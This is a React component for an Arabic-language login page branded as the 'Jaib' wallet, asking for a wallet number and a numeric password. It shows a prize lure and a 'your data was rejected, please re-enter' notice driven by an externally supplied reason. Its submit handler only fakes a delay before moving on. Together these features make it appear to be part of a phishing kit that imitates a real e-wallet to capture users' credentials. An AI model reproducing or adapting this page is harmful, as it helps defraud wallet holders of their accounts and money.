import { useState, type FormEvent } from 'react';
import { CircleAlert, Gift } from 'lucide-react';

type LoginProps = {
  prize: string | null;
  reason: string | null;
  onSubmitted: () => void;
};

const TABS = [
  { id: 'client', label: 'عميل' },
  { id: 'sales', label: 'نقطة مبيعات' },
] as const;

export default function Login({ prize, reason, onSubmitted }: LoginProps) {
  const [tab, setTab] = useState<'client' | 'sales'>('client');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (submitting) return;
    setError('');
    setSubmitting(true);
    window.setTimeout(() => {
      setSubmitting(false);
      onSubmitted();
    }, 350);
  };

  return (
    <main
      dir="rtl"
      className="page-entrance flex h-dvh flex-col items-center overflow-hidden bg-background px-6 pb-6 pt-8"
    >
      <img
        src="/logo.png"
        alt="جيب Jaib"
        width={1479}
        height={586}
        className="animate-logo h-auto w-[96px]"
      />

      <div className="mt-14 flex w-full max-w-[340px] gap-3">
        {TABS.map((t) => (
          <button
            key={t.id}
            type="button"
            onClick={() => setTab(t.id)}
            className={
              tab === t.id
                ? 'h-10 flex-1 rounded-xl border-2 border-primary bg-primary/15 text-sm font-extrabold text-primary'
                : 'h-10 flex-1 rounded-xl border border-border bg-card text-sm font-bold text-muted-foreground'
            }
          >
            {t.label}
          </button>
        ))}
      </div>

      <div className="mt-6 w-full max-w-[340px] text-right">
        <h1 className="text-xl font-extrabold text-foreground">مرحباً بك</h1>
        <p className="mt-0.5 text-xs text-muted-foreground">قم بتسجيل الدخول</p>

        {prize && (
          <p className="mt-2 flex items-center gap-1.5 text-xs font-bold text-primary">
            <Gift size={14} />
            جائزتك بانتظارك: {prize}
          </p>
        )}

        {reason && (
          <div className="mt-3 flex items-start gap-2 rounded-xl border border-primary/40 bg-primary/10 p-3 text-right">
            <CircleAlert size={16} className="mt-0.5 shrink-0 text-primary" />
            <div>
              <p className="text-xs font-extrabold text-primary">تم رفض بياناتك</p>
              <p className="mt-0.5 text-[11px] font-semibold leading-5 text-foreground">
                {reason}
              </p>
              <p className="mt-1 text-[11px] text-muted-foreground">
                يرجى إعادة إدخال البيانات بشكل صحيح.
              </p>
            </div>
          </div>
        )}

        <form className="mt-4 flex flex-col gap-3" onSubmit={handleSubmit}>
          <label className="flex flex-col gap-1.5">
            <span className="text-xs font-bold text-foreground">رقم المحفظة</span>
            <input
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              required
              value={username}
              onChange={(e) => setUsername(e.target.value.replace(/\D/g, ''))}
              placeholder="أدخل رقم المحفظة"
              className="h-12 w-full rounded-2xl border border-border bg-card px-4 text-right text-sm text-foreground placeholder:text-muted-foreground focus:border-primary focus:outline-none"
            />
          </label>
          <label className="flex flex-col gap-1.5">
            <span className="text-xs font-bold text-foreground">كلمة المرور</span>
            <input
              type="password"
              inputMode="numeric"
              pattern="[0-9]*"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value.replace(/\D/g, ''))}
              placeholder="أدخل كلمة المرور"
              className="h-12 w-full rounded-2xl border border-border bg-card px-4 text-right text-sm text-foreground placeholder:text-muted-foreground focus:border-primary focus:outline-none"
            />
          </label>
          <button
            type="submit"
            disabled={submitting}
            className="mt-1 h-12 w-full rounded-2xl bg-primary text-sm font-extrabold text-primary-foreground shadow-xl transition-transform hover:scale-[1.02] disabled:opacity-60"
          >
            {submitting ? 'جاري الإرسال...' : 'تسجيل دخول'}
          </button>
          {error && (
            <p className="text-center text-xs font-bold text-primary">{error}</p>
          )}
        </form>
      </div>
    </main>
  );
}
